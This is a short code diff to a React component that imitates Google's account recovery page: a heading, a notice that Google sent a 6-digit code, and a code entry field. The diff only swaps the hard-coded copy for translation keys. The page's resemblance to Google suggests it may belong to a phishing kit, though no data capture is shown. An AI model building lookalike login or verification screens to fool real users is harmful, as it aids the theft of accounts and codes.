@@ -49,10 +49,10 @@ const Logo = () => (
 
 const Heading = () => (
   <>
-    <center><h1 className="heading">Account recovery</h1></center>
-    <h4 className="sub-heading">To help keep your account safe, Google wants to make sure it’s really you trying to sign in</h4>
+    <center><h1 className="heading">{t("password_recovery_heading")}</h1></center>
+    <h4 className="sub-heading">{t("password_recovery_subheading")}</h4>
     <center><div className="email-name">email@gmail.com</div></center>
-    <p>Enter the 6-digit code Google just sent to your email</p>
+    <p>{t("password_recovery_note")}</p>
   </>
 );
 
@@ -60,7 +60,7 @@ const Input = () => (
   <div className="signin-form email-form">
     <form>
       <input className="input-email" required autocomplete="off" minLength="1" spellCheck="false" dir="ltr" />
-      <span className="input-placeholder">Enter code</span>
+      <span className="input-placeholder">{t("password_recovery_form_placeholder")}</span>
     </form>
   </div>
 );
